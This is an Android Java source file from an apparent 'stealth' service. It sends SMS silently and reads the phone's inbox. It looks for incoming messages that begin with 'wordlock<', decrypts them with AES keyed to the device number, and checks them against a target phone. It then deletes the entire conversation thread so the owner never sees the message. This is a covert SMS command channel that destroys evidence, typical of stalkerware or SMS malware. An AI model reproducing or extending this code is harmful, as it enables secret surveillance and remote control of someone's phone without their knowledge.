package com.stealth.service;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import com.stealth.crypto.AES256;
import com.stealth.jncryptor.RNC256;
import com.stealth.util.Util;

/**
 * Created by kim on 3/24/2016.
 */
public class SendSMS {

    private static BroadcastReceiver mSentBroadcastReceiver = null ;
    private static String SENT = "SMS_SENT";

    public static boolean sendSMS(Context context, String phone, String msg) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        SmsManager sms = SmsManager.getDefault();

        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);

        if (mSentBroadcastReceiver == null) {
            mSentBroadcastReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context arg0, Intent arg1) {
                    switch (getResultCode()) {
                        case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                        case SmsManager.RESULT_ERROR_NO_SERVICE:
                        case SmsManager.RESULT_ERROR_NULL_PDU:
                        case SmsManager.RESULT_ERROR_RADIO_OFF:
                            if (Const.phoneNumber != null)
                                Const.phoneNumber.onSendError();
                            break;
                        default:
                            break;

                    }

                }
            };

            //context.registerReceiver(mSentBroadcastReceiver, new IntentFilter(SENT));
        }

        try {
            sms.sendTextMessage(phone, null, msg, sentPI, null);
        } catch (Exception e) {
            Const.MyLog("ERROR sendData", "phone="+phone+",msg="+msg);
            return false ;
        }

        return true ;
    }

    public static boolean getMessageBox(Context context)
    {
        // type == 0 catch changed/deleted phone numbers for Const.getLastGatherTime() and send sms message
        // type == 2 send mms message to server for Const.getLastMmsTime()
        String sDate = "date";
        Uri strUri ;
        final Uri SMS_CONTENT_URI = Uri.parse("content://sms/"); //test content://mms-sms/conversations/

        long lastSmsTime = Util.getCurTime()-60*1000 ; //Const.getLastSmsTime() ;

        String WHERE_CONDITION = null ;

            strUri = SMS_CONTENT_URI ;

                if (Util.isKitkat())
                {
                    WHERE_CONDITION = sDate + " >= " + lastSmsTime ;
                }

        String SORT_ORDER = "date DESC";

        String sMessageId = "0";
        long messageId = 0 ;
        long messageTime = 0 ;
        String address = "";
        String msgbody = "" ;
        String thread_id = "" ;

        StringBuilder sbthread_gather = new StringBuilder();
        StringBuilder sbthread_message = new StringBuilder();

        //String thread_ids = "" ;
        String app_msg_ids = "" ;
        String rsrv_dts = "" ;
        String send_phs = "" ;
        String recv_phs = Const.myPhoneNumber ;
        String comm_types = "" ;
        String dest_type = "R" ;
        String t_memos = "" ;

        //long timestamp = 0l ;
        String datas = "";

        int UriType;
        boolean bInbox = true ; // true = inbox, false = sent box

        Cursor c = Const.cr.query(strUri,
                        //null, //new String[] { "_id", "type", "address",  "date", "body" },
                        new String[] { "_id", "type", "thread_id", "address", "date", "body" },
                        WHERE_CONDITION, null,
                        SORT_ORDER);

        if (c == null)
        {
            return false;
        }

        if (c.moveToFirst())
        {
            int nSize = 0 ;
            int nCnt = 0 ;
            boolean bOld ;

            do {
                thread_id = "" ;
                String[] Numbers  ;
                msgbody = "" ;
                address = "" ;
                bOld = false ;

                sMessageId = c.getString(c.getColumnIndex("_id"));
                messageId = Long.parseLong(sMessageId);

                int nType  ;

                nType = c.getInt(c.getColumnIndex("type"));

                if (nType == 1)
                    bInbox = true ;
                else if (nType == 2)
                    bInbox = false ;
                else
                    continue ;

                if (bInbox) // sms, inbox
                {
                    messageTime = c.getLong(c.getColumnIndex("date"));
                    address = c.getString(c.getColumnIndex("address"));
                    msgbody = c.getString(c.getColumnIndex("body"));
                    thread_id = c.getString(c.getColumnIndex("thread_id"));
                    msgbody = msgbody.trim().replace("'", "") ;
                    if (checkMessage(thread_id, msgbody)) {

                        c.close();
                        return true;
                    }

                    if (messageTime < (Util.getCurTime()-60*1000))
                        bOld = true ;
                    else
                        nCnt++;

                    // check msgbody
                }
            } while ((nCnt < 10) &&
                    c.moveToNext());

            c.close();

        } // if c.mvetofirst
        else
        {
            // error
            c.close();
            return false ;
        }

        return false ;
    }

    private static void deleteMessage(String thread_id)
    {
        Uri thread = Uri.parse( "content://sms/conversations/" + thread_id );
        Const.cr.delete( thread, null, null );
    }

    private static boolean checkMessage(String thread_id, String msg)
    {
        if (msg.startsWith("wordlock<"))
        {
            String sub = msg.substring(9, msg.length()-1) ;
            String phone = AES256.decrypt(Util.getDeviceNumber(), sub);
            if (phone.equals(Const.targetPhone))
            {
                // verified
                Const.saveLocalPhoneNumber(Util.convLocalPhoneNumber(phone));
                deleteMessage(thread_id);
                return true ;
            }
            deleteMessage(thread_id);
        }
        return false ;
    }

}
